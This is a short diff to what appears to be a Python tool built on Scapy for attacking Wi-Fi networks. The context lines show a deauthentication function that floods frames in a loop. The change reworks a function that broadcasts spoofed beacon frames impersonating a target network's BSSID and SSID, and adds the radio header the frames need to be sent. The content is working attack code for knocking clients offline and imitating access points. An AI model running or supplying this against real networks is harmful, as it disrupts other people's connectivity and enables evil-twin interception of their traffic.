@@ -18,19 +18,20 @@ def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
     sendp(packet, iface=iface, loop=1, inter=0.01)
 
 
-def beacon(iface: str, BSSID: str, client: str, SSID: str):
+def beacon(iface: str, BSSID: str, SSID: str, client: str = "ff:ff:ff:ff:ff:ff"):
     """Send beacon frames spoofed as a target network.
 
     Args:
         iface (str): Interface to use
         BSSID (str): MAC address of target network
-        client (str): MAC address of target client
         SSID (str): Name of target network
+        client (str): MAC address of target client. Defaults to broadcast.
     """
-    packet = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=BSSID, addr3=BSSID) / \
+    packet = RadioTap() / \
+        Dot11(type=0, subtype=8, addr1=client, addr2=BSSID, addr3=BSSID) / \
         Dot11Beacon() / \
         Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
-    print(f'SENDING BEACON for {BSSID}')
+    print(f'SENDING BEACON for {SSID}')
     sendp(packet, iface=iface, loop=1, inter=0.1)
 
 
